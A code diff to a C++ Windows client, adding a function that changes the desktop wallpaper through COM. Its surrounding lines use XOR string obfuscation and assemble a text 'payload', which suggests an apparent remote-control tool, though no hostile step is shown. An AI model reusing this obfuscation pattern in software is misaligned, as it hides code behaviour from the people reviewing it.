@@ -3,6 +3,8 @@
 #include <GdiPlus.h>
 #include <regex>
 #include <filesystem>
+#include "wininet.h"
+#include "shlobj.h"
 
 #include "functions.h"
 #include "..\utility\xor.hpp"
@@ -13,6 +15,7 @@
 #pragma comment(lib,"Wininet.lib")
 #pragma comment(lib,"gdiplus.lib")
 #pragma comment(lib,"Gdi32.lib")
+#pragma comment(lib, "Ole32.lib")
 
 using namespace Gdiplus;
 namespace fs = std::filesystem;
@@ -168,6 +171,21 @@ namespace client {
 			payload += xorstr_("```\n");
 
 			return payload;
+		}
+
+		void set_wallpaper(LPCWSTR file) {
+			CoInitializeEx(0, COINIT_APARTMENTTHREADED);
+			IActiveDesktop* desktop;
+			HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
+			WALLPAPEROPT wOption;
+			ZeroMemory(&wOption, sizeof(WALLPAPEROPT));
+			wOption.dwSize = sizeof(WALLPAPEROPT);
+			wOption.dwStyle = WPSTYLE_CENTER;
+			status = desktop->SetWallpaper(file, 0);
+			status = desktop->SetWallpaperOptions(&wOption, 0);
+			status = desktop->ApplyChanges(AD_APPLY_ALL);
+			desktop->Release();
+			CoUninitialize();
 		}
 	}
 }
